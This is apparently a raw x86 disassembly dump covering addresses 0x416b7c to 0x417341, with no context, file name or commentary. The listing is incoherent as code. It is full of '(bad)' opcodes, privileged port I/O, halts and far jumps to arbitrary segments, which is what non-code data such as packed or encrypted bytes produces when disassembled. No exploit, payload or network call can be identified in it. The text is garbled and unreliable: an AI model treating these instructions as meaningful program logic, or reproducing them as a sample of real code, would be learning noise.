  416b7c:	sbb    ah,BYTE PTR [ebx-0xc5fb3f0]
  416b82:	or     DWORD PTR [edi-0x6e],edx
  416b85:	pushf  
  416b86:	cmp    edx,DWORD PTR [ebx+0x2dc72258]
  416b8c:	lods   eax,DWORD PTR ds:[esi]
  416b8d:	das    
  416b8e:	in     eax,0xc7
  416b90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b91:	xor    eax,0x69f08866
  416b96:	fcmove st,st(6)
  416b98:	stos   BYTE PTR es:[edi],al
  416b99:	xor    DWORD PTR [ebx+0x61],esi
  416b9c:	test   DWORD PTR [ecx],eax
  416b9e:	loopne 0x416be6
  416ba0:	xor    eax,0x6c18f1aa
  416ba5:	xlat   BYTE PTR ds:[ebx]
  416ba6:	sub    al,0xdd
  416ba8:	mov    ds:0xd29ead8f,eax
  416bad:	jns    0x416b92
  416baf:	jmp    0x6648:0x8f7db89a
  416bb6:	lods   eax,DWORD PTR ds:[esi]
  416bb7:	div    BYTE PTR [edx-0x1fa622b9]
  416bbd:	stos   BYTE PTR es:[edi],al
  416bbe:	mov    esi,0xbe1b219e
  416bc3:	pop    ebp
  416bc4:	icebp  
  416bc5:	dec    ebx
  416bc6:	or     bh,0x6b
  416bc9:	dec    esp
  416bca:	out    dx,eax
  416bcb:	xchg   esp,eax
  416bcc:	dec    edi
  416bcd:	enter  0xa2c4,0x1a
  416bd1:	mov    cl,0x7e
  416bd3:	repz (bad) 
  416bd5:	rcl    DWORD PTR [esi],cl
  416bd7:	jmp    0x2f60:0x59eb3165
  416bde:	cmc    
  416bdf:	cmp    edi,DWORD PTR [eax+ebp*4]
  416be2:	in     eax,dx
  416be3:	and    BYTE PTR [ebp+0x4e7f0283],ch
  416be9:	mov    bl,BYTE PTR [ebp-0x69d3dce3]
  416bef:	and    BYTE PTR [ecx-0x6af23d1],al
  416bf5:	xor    ebx,ecx
  416bf7:	mov    ds,ebx
  416bf9:	mov    eax,0xb56d5609
  416bfe:	shl    BYTE PTR ds:0x28fb127c,cl
  416c04:	mov    ebp,0x983fc6d5
  416c09:	add    al,0x2f
  416c0b:	fwait
  416c0c:	dec    ebp
  416c0d:	pop    esi
  416c0e:	ins    DWORD PTR es:[edi],dx
  416c0f:	mov    BYTE PTR [ebx+0x402033b3],cl
  416c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c16:	adc    eax,0x9ef11ec7
  416c1b:	pop    eax
  416c1c:	int    0xfc
  416c1e:	xor    BYTE PTR [eax+ebx*1+0x64],ah
  416c22:	fwait
  416c23:	xchg   ebp,eax
  416c24:	cmp    al,0x58
  416c26:	out    0x2f,al
  416c28:	mov    ds:0x8a6438d1,al
  416c2d:	loop   0x416c16
  416c2f:	adc    eax,0x943fc4b5
  416c34:	cmp    al,0xa1
  416c36:	xchg   esi,eax
  416c37:	mov    bh,0xeb
  416c39:	(bad)  
  416c3a:	cld    
  416c3b:	adc    ebx,DWORD PTR [edi+ebp*8]
  416c3e:	aad    0x54
  416c40:	or     al,0xb5
  416c42:	stos   DWORD PTR es:[edi],eax
  416c43:	cld    
  416c44:	inc    esp
  416c45:	ins    BYTE PTR es:[edi],dx
  416c46:	fld    DWORD PTR [esi]
  416c48:	and    ebp,DWORD PTR [ebp+0x629d9d57]
  416c4e:	mov    bh,0xe
  416c50:	and    al,bl
  416c52:	jcxz   0x416c90
  416c55:	fsubr  QWORD PTR [ecx-0x562e2e78]
  416c5b:	stc    
  416c5c:	iret   
  416c5d:	call   0xa184:0x4cf8fcd
  416c64:	std    
  416c65:	jmp    0x416c3c
  416c67:	rcl    DWORD PTR [esi-0x65],0x61
  416c6b:	jge    0x416c32
  416c6d:	sub    al,0xdc
  416c6f:	cdq    
  416c70:	jp     0x416c4f
  416c72:	sub    esp,0x8b21a39d
  416c78:	into   
  416c79:	jle    0x416c3b
  416c7b:	xor    al,0x22
  416c7d:	loopne 0x416cec
  416c7f:	push   edx
  416c80:	sbb    BYTE PTR [ebp+0x2d10903e],ah
  416c86:	mov    bl,BYTE PTR [esi]
  416c88:	mov    esi,0x44c7c2a4
  416c8d:	test   eax,0x47393abd
  416c92:	scas   eax,DWORD PTR es:[edi]
  416c93:	aam    0xc6
  416c95:	jae    0x416c5f
  416c97:	adc    BYTE PTR [edx+edi*4-0x38defe4b],al
  416c9e:	in     eax,0xc4
  416ca0:	inc    esi
  416ca1:	shl    edi,cl
  416ca3:	jno    0x416c85
  416ca5:	popf   
  416ca6:	push   esi
  416ca7:	pop    esp
  416ca8:	(bad)  
  416caa:	rcl    DWORD PTR [edi],cl
  416cac:	mov    esp,0x66a6b6f2
  416cb1:	xchg   edi,eax
  416cb2:	(bad)  
  416cb3:	push   ss
  416cb4:	and    eax,0x3d51bdda
  416cb9:	inc    eax
  416cba:	inc    ecx
  416cbb:	ret    0xd333
  416cbe:	adc    eax,0xdf57326c
  416cc3:	pop    ds
  416cc4:	cmp    bh,BYTE PTR [ecx+0x1d031547]
  416cca:	ins    DWORD PTR es:[edi],dx
  416ccb:	fstp   QWORD PTR [ebx]
  416ccd:	ror    DWORD PTR [esi+0x68652e27],cl
  416cd3:	out    dx,al
  416cd4:	stos   BYTE PTR es:[edi],al
  416cd5:	push   ebx
  416cd6:	imul   esp,DWORD PTR [edx],0xffffffc2
  416cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cda:	mov    esp,0x8d6f28d4
  416cdf:	or     esi,DWORD PTR gs:[ebx-0x7]
  416ce3:	push   esi
  416ce4:	int    0x8f
  416ce6:	loope  0x416d4f
  416ce8:	es push eax
  416cea:	push   ds
  416ceb:	sub    al,0x71
  416ced:	(bad)  
  416cee:	dec    eax
  416cef:	push   0x49
  416cf1:	mov    cl,0x69
  416cf3:	stos   BYTE PTR es:[edi],al
  416cf4:	and    DWORD PTR [eax],0x16e9827f
  416cfa:	mov    al,0x53
  416cfc:	push   esi
  416cfd:	mov    al,0x1
  416cff:	sub    ecx,DWORD PTR [esi-0x13]
  416d02:	mul    BYTE PTR [eax-0x19]
  416d05:	xor    ebp,ebx
  416d07:	mov    edi,0x3914862e
  416d0c:	cdq    
  416d0d:	dec    esp
  416d0e:	add    BYTE PTR [ebx],ch
  416d10:	sti    
  416d11:	or     eax,0x3d2fd7e9
  416d16:	fidiv  DWORD PTR [edx]
  416d18:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  416d1a:	fmul   DWORD PTR [esi-0x16a0de9b]
  416d20:	adc    dl,BYTE PTR [edi+eax*8-0x1]
  416d24:	loope  0x416d26
  416d26:	jns    0x416d30
  416d28:	xlat   BYTE PTR ds:[ebx]
  416d29:	adc    eax,0x71cd9167
  416d2e:	js     0x416da6
  416d30:	xchg   ebx,ebx
  416d32:	mov    dl,BYTE PTR [edi-0x8c3ecba]
  416d38:	outs   dx,BYTE PTR ds:[esi]
  416d39:	push   0x5e
  416d3b:	push   ebp
  416d3c:	jmp    0x944c:0x8c643fe7
  416d43:	or     eax,0x7bbcbcb1
  416d48:	shl    BYTE PTR [edi-0x76],0xf
  416d4c:	mov    al,ds:0x677560fe
  416d51:	jae    0x416d25
  416d53:	popa   
  416d54:	jecxz  0x416da9
  416d56:	or     eax,0xf9b9e1ef
  416d5b:	dec    esi
  416d5c:	xlat   BYTE PTR ds:[ebx]
  416d5d:	call   0x4fae619f
  416d62:	mov    eax,0xd0c3c2e0
  416d67:	mov    edi,0x38b87d62
  416d6c:	js     0x416d99
  416d6e:	mov    DWORD PTR [eax-0x389b7eec],ecx
  416d74:	iret   
  416d75:	push   es
  416d76:	call   0xbd13987f
  416d7b:	jmp    0xa88f:0x1816240
  416d82:	xchg   esp,eax
  416d83:	(bad)  
  416d84:	daa    
  416d85:	mov    edi,DWORD PTR [ebx-0x33f08251]
  416d8b:	add    eax,DWORD PTR [ebp+0x1051d75a]
  416d91:	out    0xfe,eax
  416d93:	cmp    DWORD PTR [edx-0x3],0x7
  416d97:	jno    0x416d97
  416d99:	xchg   BYTE PTR [edi-0x71],dl
  416d9c:	jl     0x416d7d
  416d9e:	frstpm(287 only) 
  416da0:	fsub   QWORD PTR ds:0x704c6598
  416da6:	pop    eax
  416da7:	xor    BYTE PTR [esi+0x30],bl
  416daa:	hlt    
  416dab:	ss xchg edi,eax
  416dad:	mov    al,0x67
  416daf:	add    edi,esp
  416db1:	and    ecx,edi
  416db3:	jmp    0xe9b36647
  416db8:	fbld   TBYTE PTR [ebx+ebp*1+0x26bd9750]
  416dbf:	sub    eax,0x85c6fe4
  416dc4:	dec    ebp
  416dc5:	add    DWORD PTR [edx],ebx
  416dc7:	or     edi,ecx
  416dc9:	inc    ebp
  416dca:	lahf   
  416dcb:	sbb    ch,BYTE PTR [ecx+0x37]
  416dce:	call   0x74c8:0x6faf7947
  416dd5:	outs   dx,DWORD PTR ds:[esi]
  416dd6:	scas   eax,DWORD PTR es:[edi]
  416dd7:	mov    bl,0x98
  416dd9:	ficom  DWORD PTR [esi+0x40f165b8]
  416ddf:	shr    BYTE PTR [ebp+0x24eed949],0xf4
  416de6:	pop    edx
  416de7:	shl    ebx,cl
  416de9:	dec    ecx
  416dea:	jp     0x416d81
  416dec:	dec    ecx
  416ded:	idiv   DWORD PTR [ebx+0x48e73327]
  416df3:	into   
  416df4:	mov    esp,esp
  416df6:	adc    DWORD PTR [edx-0x3a],edx
  416df9:	ss sub al,0x97
  416dfc:	mov    DWORD PTR [esi],esi
  416dfe:	mov    eax,0x8da142ad
  416e03:	pop    eax
  416e04:	and    al,0xf5
  416e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e07:	mov    ecx,0xd1eeff51
  416e0c:	jbe    0x416e53
  416e0e:	add    eax,0x63f54258
  416e13:	data16 sub BYTE PTR [edi-0x61],bh
  416e17:	int    0x2c
  416e19:	inc    ebp
  416e1a:	mov    edx,0xafca1c77
  416e1f:	xchg   edi,eax
  416e20:	adc    al,0x4e
  416e22:	and    al,0x46
  416e24:	mov    dh,0xae
  416e26:	mov    ds:0x62398b8e,eax
  416e2b:	mov    ebp,0x93ca2205
  416e30:	push   esi
  416e31:	xchg   edx,eax
  416e32:	jmp    0x416dea
  416e34:	or     BYTE PTR [edi+0x6eb6aed0],ch
  416e3a:	(bad)  
  416e3b:	dec    eax
  416e3c:	mov    ds:0xf2ee7e55,al
  416e41:	ret    
  416e42:	add    eax,0x61bb6b3a
  416e47:	push   0xffffffee
  416e49:	ins    BYTE PTR es:[edi],dx
  416e4a:	ret    0x8a7b
  416e4d:	fidiv  DWORD PTR [ecx]
  416e4f:	fistp  DWORD PTR [ebp+esi*8+0x682f6502]
  416e56:	fsub   QWORD PTR [edi+0x360ca17e]
  416e5c:	sti    
  416e5d:	jp     0x416e60
  416e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e60:	ss push ds
  416e62:	mov    edi,0x2b53bdf0
  416e67:	fmul   st(5),st
  416e69:	inc    BYTE PTR [edx]
  416e6b:	mov    eax,0xb5c2b038
  416e70:	jmp    0x8e9d4ad2
  416e75:	cld    
  416e76:	test   DWORD PTR [ebx+ebx*2-0x572faf81],esp
  416e7d:	arpl   si,bx
  416e7f:	popa   
  416e80:	sbb    al,0xc8
  416e82:	and    ch,BYTE PTR [ecx]
  416e84:	inc    ebp
  416e85:	iret   
  416e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e87:	fwait
  416e88:	jle    0x416ea9
  416e8a:	add    DWORD PTR cs:[edi+ebx*2+0x4c],edx
  416e8f:	repz inc ecx
  416e91:	sub    DWORD PTR [eax+ecx*4-0x15],ebp
  416e95:	test   DWORD PTR [edx+0x51b3e60c],ebp
  416e9b:	das    
  416e9c:	out    0x3c,al
  416e9e:	jns    0x416e89
  416ea0:	jb     0x416e8e
  416ea2:	jecxz  0x416f23
  416ea4:	push   esi
  416ea5:	rol    BYTE PTR [esi],cl
  416ea7:	dec    ebx
  416ea8:	jg     0x416e6f
  416eaa:	and    dl,BYTE PTR [edx-0xf44da61]
  416eb0:	jnp    0x416ea4
  416eb2:	xor    DWORD PTR [edx],0xfffffffb
  416eb5:	cdq    
  416eb6:	dec    esp
  416eb7:	loopne 0x416ea7
  416eb9:	scas   eax,DWORD PTR es:[edi]
  416eba:	test   BYTE PTR [ebx+ecx*1+0x645a72c2],ch
  416ec1:	enter  0xd2e8,0x14
  416ec5:	in     eax,0xc4
  416ec7:	sbb    DWORD PTR [esi-0xc],edx
  416eca:	sub    al,0x18
  416ecc:	neg    BYTE PTR [edi-0x7e8a28c8]
  416ed2:	inc    ebx
  416ed3:	push   ds
  416ed4:	ins    DWORD PTR es:[edi],dx
  416ed5:	add    al,0x52
  416ed7:	push   0x21f96e66
  416edc:	enter  0xe733,0xc6
  416ee0:	inc    ecx
  416ee1:	inc    esi
  416ee2:	hlt    
  416ee3:	mov    dh,0x61
  416ee5:	jb     0x416e76
  416ee7:	test   eax,0xcef235d3
  416eec:	mov    edi,0xd1eb387d
  416ef1:	mov    ebx,0x766ed008
  416ef6:	les    ecx,FWORD PTR [eax]
  416ef8:	inc    edx
  416ef9:	adc    BYTE PTR [eax+eiz*4-0x10],al
  416efd:	inc    edx
  416efe:	nop
  416eff:	mov    dl,BYTE PTR [edx+0x516ee0ec]
  416f05:	sar    BYTE PTR [edx+0x5d07a569],0x2d
  416f0c:	test   al,0x9
  416f0e:	sbb    cl,bh
  416f10:	ficomp WORD PTR [eax]
  416f12:	ret    
  416f13:	cs push ds
  416f15:	sub    al,0xfc
  416f17:	cmp    al,0x39
  416f19:	popf   
  416f1a:	mov    bh,0x7
  416f1c:	cdq    
  416f1d:	test   eax,0x2e8532a9
  416f22:	cmp    BYTE PTR [edi],dl
  416f24:	pop    ebp
  416f25:	cmc    
  416f26:	ins    DWORD PTR es:[edi],dx
  416f27:	ins    DWORD PTR es:[edi],dx
  416f28:	jae    0x416f43
  416f2a:	loopne 0x416f46
  416f2c:	fwait
  416f2d:	sub    al,0xa8
  416f2f:	out    0x4e,eax
  416f31:	mov    ?,esi
  416f33:	in     eax,dx
  416f34:	inc    esi
  416f35:	sbb    DWORD PTR [eax+0x30f66e7b],edi
  416f3b:	cmc    
  416f3c:	into   
  416f3d:	inc    edi
  416f3e:	jmp    0x416f6f
  416f40:	dec    edx
  416f41:	xlat   BYTE PTR ds:[ebx]
  416f42:	leave  
  416f43:	push   0xb
  416f45:	jecxz  0x416f9e
  416f47:	and    bh,dl
  416f49:	pop    ebx
  416f4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f4b:	adc    ebp,ebp
  416f4d:	sub    BYTE PTR [ebp+ecx*1+0x5a19573b],0x3b
  416f55:	pushf  
  416f56:	mov    BYTE PTR [ebp-0x3bef826e],cl
  416f5c:	ret    0x8733
  416f5f:	stos   BYTE PTR es:[edi],al
  416f60:	mov    bh,0x75
  416f62:	pop    es
  416f63:	sbb    BYTE PTR [edi+ecx*8+0x56f084d4],bh
  416f6a:	mov    ch,0xf0
  416f6c:	dec    esp
  416f6d:	pushf  
  416f6e:	inc    ecx
  416f6f:	jmp    0x855e33f3
  416f74:	lods   al,BYTE PTR ds:[esi]
  416f75:	nop
  416f76:	stc    
  416f77:	sub    esp,ecx
  416f79:	mov    bh,0xed
  416f7b:	or     edi,DWORD PTR [edx+0x75]
  416f7e:	xor    BYTE PTR ss:[edi+0x43],ah
  416f82:	jne    0x416f50
  416f84:	cdq    
  416f85:	jl     0x416f68
  416f87:	xchg   BYTE PTR [esi+0x34],al
  416f8a:	adc    eax,DWORD PTR [edx+0x50865a1b]
  416f90:	mov    bh,0x23
  416f92:	cdq    
  416f93:	inc    ecx
  416f94:	arpl   WORD PTR [edi-0xb],di
  416f97:	int    0xc4
  416f99:	sub    eax,0xc638d702
  416f9e:	or     BYTE PTR [edi+eax*1],bh
  416fa1:	(bad)  
  416fa2:	xor    BYTE PTR [ecx+edi*1+0x7281f042],cl
  416fa9:	loop   0x416f66
  416fab:	xchg   DWORD PTR [eax-0x4d2967b9],edi
  416fb1:	test   al,0xe8
  416fb3:	aas    
  416fb4:	mov    ebp,0x7911dbcf
  416fb9:	les    edx,FWORD PTR [edx]
  416fbb:	dec    ecx
  416fbc:	lods   al,BYTE PTR ds:[esi]
  416fbd:	jne    0x416f85
  416fbf:	mov    bh,0x38
  416fc1:	sbb    dh,bl
  416fc3:	add    eax,0x33a46491
  416fc8:	(bad)  
  416fc9:	mov    esi,0xaf795ebd
  416fce:	icebp  
  416fcf:	mov    ah,0x0
  416fd1:	mov    DWORD PTR [ecx],eax
  416fd3:	retf   
  416fd4:	js     0x416fd9
  416fd6:	popf   
  416fd7:	das    
  416fd8:	mov    dl,0xca
  416fda:	push   es
  416fdb:	lea    esp,[ecx]
  416fdd:	(bad)  
  416fde:	(bad)  
  416fdf:	js     0x416ff0
  416fe1:	add    DWORD PTR ss:[edi+0x74],ebp
  416fe5:	lds    edx,FWORD PTR [edx-0x15]
  416fe8:	push   ss
  416fe9:	xor    BYTE PTR [edx],dl
  416feb:	mul    DWORD PTR [ecx]
  416fed:	popf   
  416fee:	jmp    0x41ba8ded
  416ff3:	push   ds
  416ff4:	out    0x9a,eax
  416ff6:	mov    al,ds:0xcbf78f09
  416ffb:	dec    eax
  416ffc:	(bad)  
  416ffe:	jg     0x41706f
  417000:	outs   dx,BYTE PTR ds:[esi]
  417001:	inc    ecx
  417002:	push   esp
  417003:	sar    BYTE PTR [edx+eax*1],cl
  417006:	push   esi
  417007:	leave  
  417008:	jb     0x416fc5
  41700a:	inc    edi
  41700b:	adc    al,0x32
  41700d:	jo     0x417035
  41700f:	test   eax,0x44b10500
  417014:	sbb    DWORD PTR [ebp-0x71],edx
  417017:	int3   
  417018:	gs xor al,0x58
  41701b:	iret   
  41701c:	adc    dh,ch
  41701e:	fnstcw WORD PTR [ecx-0xb]
  417021:	inc    ecx
  417022:	mov    ds:0xee7f66a3,al
  417027:	mov    dh,0xd6
  417029:	xor    dh,BYTE PTR [eax-0x1d66994]
  41702f:	pop    edx
  417030:	(bad)  
  417031:	cmp    ah,BYTE PTR [ecx-0x5986697e]
  417037:	mov    ch,0x67
  417039:	inc    edx
  41703a:	loopne 0x41706f
  41703c:	stc    
  41703d:	rcl    DWORD PTR [edx+ecx*1+0x7c],0x33
  417042:	pop    ecx
  417043:	or     DWORD PTR [ebx],esp
  417045:	in     al,dx
  417046:	in     eax,0xa9
  417048:	jmp    0x512ad188
  41704d:	mov    ds,eax
  41704f:	dec    esp
  417050:	and    al,0xd0
  417052:	fild   DWORD PTR [ebp+ebp*2+0x399b59c2]
  417059:	test   BYTE PTR [ebx],0x6c
  41705c:	push   ebx
  41705d:	push   0xffffffb5
  41705f:	into   
  417060:	mov    ds:0xd5a92d28,eax
  417065:	jae    0x417041
  417067:	cmovns ecx,esi
  41706a:	dec    ebp
  41706b:	or     DWORD PTR [edi+ecx*8-0x1288641a],0xffffffc9
  417073:	repnz out 0xb4,eax
  417076:	mov    esp,0xb4dbbf93
  41707b:	adc    bh,BYTE PTR ss:[ebx-0x30]
  41707f:	jmp    0xad1:0xe57102f
  417086:	imul   DWORD PTR [ebp+eax*1+0x6df29844]
  41708d:	add    DWORD PTR [esi+edi*8+0x3f],esp
  417091:	and    eax,0xd47f0da7
  417096:	popa   
  417097:	sti    
  417098:	or     BYTE PTR [ebx+0x21],ch
  41709b:	sub    al,0xcc
  41709d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41709e:	jge    0x417065
  4170a0:	sbb    eax,0xa618e1cc
  4170a5:	mov    al,0x5b
  4170a7:	xchg   esp,eax
  4170a8:	mov    bh,0x54
  4170aa:	and    BYTE PTR [ecx+0x6034c465],0x78
  4170b1:	inc    ebx
  4170b2:	jmp    0xf254:0xc9ec5e98
  4170b9:	fwait
  4170ba:	mov    edx,0x92de0f7d
  4170bf:	cli    
  4170c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170c1:	cwde   
  4170c2:	xor    ebx,DWORD PTR [ebp-0xf171d9b]
  4170c8:	mov    ecx,DWORD PTR [esi]
  4170ca:	add    eax,0x550317b1
  4170cf:	xchg   ebx,eax
  4170d0:	aas    
  4170d1:	jb     0x417078
  4170d3:	dec    edx
  4170d4:	jecxz  0x41712d
  4170d6:	aas    
  4170d7:	in     eax,dx
  4170d8:	jo     0x417077
  4170da:	cmp    edx,DWORD PTR [ecx+0x2fb15f3b]
  4170e0:	sbb    al,0x1c
  4170e2:	xor    edi,DWORD PTR [edi+0x4e1b8f2c]
  4170e8:	sti    
  4170e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170ea:	mov    al,0x82
  4170ec:	aas    
  4170ed:	fnstcw WORD PTR [ebp-0x650daa13]
  4170f3:	mov    WORD PTR [ecx+esi*4],gs
  4170f6:	mov    edi,0x5f403f5c
  4170fb:	push   cs
  4170fc:	ret    0x1b62
  4170ff:	xchg   ebx,eax
  417100:	mov    ah,0x1a
  417102:	popa   
  417103:	jb     0x4170e5
  417105:	jmp    0x417115
  417107:	cmp    edi,eax
  417109:	xor    ebp,ebp
  41710b:	inc    edi
  41710c:	xchg   ebx,eax
  41710d:	fmul   QWORD PTR [edx+0x780a1dc4]
  417113:	cdq    
  417114:	out    dx,eax
  417115:	push   ebx
  417116:	or     al,0xb2
  417118:	mov    ds:0x703a550e,eax
  41711d:	fstp   st(4)
  41711f:	cmp    BYTE PTR [ecx],cl
  417121:	repnz rcr BYTE PTR [ecx-0xd],1
  417125:	push   ds
  417126:	out    dx,al
  417127:	push   ecx
  417128:	(bad)  [esp+eiz*8-0x5538ef58]
  41712f:	icebp  
  417130:	inc    ebx
  417131:	add    ebp,DWORD PTR [edi+0x17]
  417134:	ja     0x41716e
  417136:	add    eax,0xcabceba6
  41713b:	fs jo  0x41715b
  41713e:	mov    bh,0xd8
  417140:	dec    ebx
  417141:	sub    BYTE PTR [edx-0x5e],dh
  417144:	push   esi
  417145:	fldcw  WORD PTR [ecx-0x1016388a]
  41714b:	push   0x75a894d3
  417150:	add    bl,dl
  417152:	mov    al,0x1f
  417154:	xor    al,0xbb
  417156:	adc    bl,al
  417158:	gs fdiv DWORD PTR ss:[ebx]
  41715c:	nop
  41715d:	sbb    BYTE PTR [ebx-0xe4e2ef],0xa1
  417164:	push   ebp
  417165:	mov    ch,0xbe
  417167:	adc    ch,BYTE PTR [ebx-0x59a615ce]
  41716d:	adc    eax,0x3bd96247
  417172:	xlat   BYTE PTR ds:[ebx]
  417173:	push   cs
  417174:	sub    cl,BYTE PTR [ebx-0x47]
  417177:	mov    WORD PTR [ecx],fs
  417179:	mov    esi,0x178ffa02
  41717e:	cmp    ecx,ecx
  417180:	(bad)  
  417182:	(bad)  
  417183:	cld    
  417184:	enter  0x7b10,0x0
  417188:	dec    esp
  417189:	or     bh,BYTE PTR [edx]
  41718b:	lea    ecx,[ebp+0x65]
  41718e:	bound  eax,QWORD PTR [ecx]
  417190:	sub    bh,bh
  417192:	inc    eax
  417193:	sub    esi,DWORD PTR [edx+esi*1]
  417196:	sbb    ecx,DWORD PTR [edi+ecx*4]
  417199:	int3   
  41719a:	stc    
  41719b:	dec    edx
  41719c:	scas   eax,DWORD PTR es:[edi]
  41719d:	xor    al,0x43
  41719f:	ins    DWORD PTR es:[edi],dx
  4171a0:	pop    ebp
  4171a1:	xchg   edx,eax
  4171a2:	dec    ebx
  4171a3:	cli    
  4171a4:	sub    al,0x7d
  4171a6:	or     al,0xfc
  4171a8:	neg    BYTE PTR [ecx]
  4171aa:	pop    ebp
  4171ab:	jmp    0x417228
  4171ad:	test   al,0x54
  4171af:	add    al,BYTE PTR [ebp+0x42]
  4171b2:	out    0xd1,eax
  4171b4:	sub    al,0x69
  4171b6:	aaa    
  4171b7:	sub    BYTE PTR [eax+0x751824a0],dl
  4171bd:	pop    edi
  4171be:	xchg   esp,eax
  4171bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171c0:	mov    eax,ds:0x977eedd6
  4171c5:	and    eax,0x663d3b17
  4171ca:	mov    ah,0x68
  4171cc:	inc    eax
  4171cd:	in     al,0x40
  4171cf:	(bad)  
  4171d0:	and    eax,0x700b345e
  4171d5:	sub    al,0xc5
  4171d7:	lahf   
  4171d8:	hlt    
  4171d9:	(bad)  
  4171da:	in     al,dx
  4171db:	sahf   
  4171dc:	or     dl,BYTE PTR [ebp+eiz*2-0x4e]
  4171e0:	cld    
  4171e1:	cld    
  4171e2:	lods   al,BYTE PTR ds:[esi]
  4171e3:	pop    ecx
  4171e4:	aas    
  4171e5:	lods   eax,DWORD PTR ds:[esi]
  4171e6:	xor    BYTE PTR [eax-0x666e29ce],cl
  4171ec:	popa   
  4171ed:	inc    DWORD PTR [eax-0xb]
  4171f0:	mov    eax,ds:0x55e5e732
  4171f5:	das    
  4171f6:	mov    al,ds:0xcccd44d6
  4171fb:	aaa    
  4171fc:	jg     0x4171b6
  4171fe:	pusha  
  4171ff:	mov    edx,0xd0d8bed8
  417204:	ret    
  417205:	or     al,0x10
  417207:	mov    ds:0x168ffd48,al
  41720c:	sahf   
  41720d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41720e:	mov    ecx,0x550355e
  417213:	(bad)  
  417214:	retf   
  417215:	ret    0x113
  417218:	inc    eax
  417219:	lds    ebp,FWORD PTR [eax]
  41721b:	shl    edx,cl
  41721d:	sbb    BYTE PTR [esi],ch
  41721f:	retf   0x4c6b
  417222:	ins    BYTE PTR es:[edi],dx
  417223:	call   0x4381a755
  417228:	pop    ss
  417229:	shr    BYTE PTR [edi],0xb4
  41722c:	adc    eax,0x42376cf4
  417231:	sbb    ch,BYTE PTR [ebx+0xfd1395c]
  417237:	xchg   BYTE PTR [eax+ebx*1-0x1960dba1],ch
  41723e:	into   
  41723f:	sbb    al,0xd3
  417241:	scas   al,BYTE PTR es:[edi]
  417242:	enter  0xa01f,0x6d
  417246:	daa    
  417247:	cmp    esp,ebx
  417249:	mov    bh,0xdd
  41724b:	adc    ebp,edi
  41724d:	mov    bh,0x8c
  41724f:	push   cs
  417250:	stc    
  417251:	sbb    DWORD PTR [ebx+0x72],0xa0bb5cea
  417258:	mov    bh,BYTE PTR [ebp+0x409d333d]
  41725e:	mov    bl,0x29
  417260:	shld   DWORD PTR [ecx-0x15],edx,0x41
  417265:	add    dl,dl
  417267:	sub    eax,0xa02a1dbf
  41726c:	rcl    BYTE PTR [edx+0x3e],0x96
  417270:	dec    esi
  417271:	in     al,dx
  417272:	sbb    BYTE PTR [esi],ah
  417274:	ror    BYTE PTR [ecx-0x28],cl
  417277:	fwait
  417278:	leave  
  417279:	sub    eax,0xed500903
  41727e:	push   ebp
  41727f:	es loop 0x4172c2
  417282:	leave  
  417283:	mov    gs,WORD PTR ds:0xba23cbcf
  417289:	in     al,dx
  41728a:	imul   ecx,DWORD PTR [eax],0x67a7c580
  417290:	aas    
  417291:	ins    DWORD PTR es:[edi],dx
  417292:	fldcw  WORD PTR [eax]
  417294:	dec    esp
  417295:	shl    dl,cl
  417297:	or     edi,DWORD PTR [ecx-0x14301216]
  41729d:	lods   eax,DWORD PTR ds:[si]
  41729f:	xchg   ebp,eax
  4172a0:	dec    ebx
  4172a1:	out    dx,al
  4172a2:	sub    al,BYTE PTR [eax]
  4172a4:	sbb    al,0x20
  4172a6:	mov    edi,0x320cf66d
  4172ab:	pusha  
  4172ac:	aam    0x28
  4172ae:	mov    edx,DWORD PTR [ebx]
  4172b0:	or     BYTE PTR [ebx],bl
  4172b2:	out    0xc8,eax
  4172b4:	cmc    
  4172b5:	pop    ebp
  4172b6:	and    al,0xb6
  4172b8:	mul    ah
  4172ba:	ret    0x8a17
  4172bd:	rol    DWORD PTR [eax],1
  4172bf:	add    edi,ebp
  4172c1:	call   FWORD PTR [eax]
  4172c3:	ins    BYTE PTR es:[edi],dx
  4172c4:	not    DWORD PTR [ebp+0x4fc1f7ae]
  4172ca:	into   
  4172cb:	test   al,0x6f
  4172cd:	loope  0x417271
  4172cf:	(bad)  
  4172d0:	dec    edi
  4172d1:	loopne 0x4172ef
  4172d3:	stos   BYTE PTR es:[edi],al
  4172d4:	call   0x3775:0x9619b89b
  4172db:	out    0x8c,eax
  4172dd:	cli    
  4172de:	add    eax,0xa06befcb
  4172e3:	daa    
  4172e4:	xor    al,0x7f
  4172e6:	cld    
  4172e7:	(bad)  
  4172e8:	jbe    0x41733d
  4172ea:	push   cs
  4172eb:	mov    ch,0x33
  4172ed:	add    esp,DWORD PTR [eax]
  4172ef:	mov    eax,0xb540369c
  4172f4:	cmp    eax,0x44a1b3d9
  4172f9:	cli    
  4172fa:	mov    ch,0x1
  4172fc:	inc    eax
  4172fd:	sbb    ecx,esp
  4172ff:	lahf   
  417300:	and    eax,0x11addb9d
  417305:	loopne 0x417353
  417307:	xor    DWORD PTR [edx-0x17a6efc],ebx
  41730d:	cmp    al,0x14
  41730f:	inc    ebp
  417310:	outs   dx,BYTE PTR ds:[esi]
  417311:	inc    edx
  417312:	cmc    
  417313:	inc    edi
  417314:	lock and DWORD PTR [ebx+0x78],esi
  417318:	inc    ebp
  417319:	cmp    eax,0xe2d4b2f3
  41731e:	lahf   
  41731f:	mov    ebp,esi
  417321:	mov    ds:0x60cc7823,al
  417326:	sti    
  417327:	in     al,dx
  417328:	in     al,0xa3
  41732a:	sub    al,0x42
  41732c:	in     al,dx
  41732d:	pop    edx
  41732e:	dec    esp
  41732f:	rcl    edi,0xad
  417332:	outs   dx,DWORD PTR ds:[esi]
  417333:	xchg   BYTE PTR [eax-0x42d275f9],dl
  417339:	adc    al,0xf9
  41733b:	es xor eax,0xfcd57137
  417341:	test   DWORD PTR [edx+0x346e963b],ecx
